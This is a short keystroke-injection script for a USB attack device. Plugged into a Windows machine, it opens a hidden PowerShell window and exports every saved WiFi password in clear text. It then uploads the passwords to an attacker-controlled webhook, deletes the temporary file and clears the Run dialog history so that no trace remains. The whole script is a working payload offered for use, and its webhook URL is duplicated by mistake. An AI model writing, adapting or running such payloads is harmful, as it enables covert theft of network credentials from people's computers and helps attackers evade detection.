REM WiFi data exfiltration payload. This payload is completely invisible on screen and has no histroy of ever being ran.

DELAY 3000
GUI R
DELAY 100
STRING powershell -noexit -W hidden ; $TempDir = [System.IO.Path]::GetTempPath() ; cd $TempDir ; netsh wlan export profile key=clear ; Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS ; Invoke-WebRequest -Uri https://webhook.site/https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS ; Remove-Item Wi-Fi-PASS -Force -ErrorAction SilentlyContinue ; Remove-ItemProperty -Path ‘HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’ -Name ‘*’ -ErrorAction SilentlyContinue ; exit
ENTER
DELAY 1000
EXIT
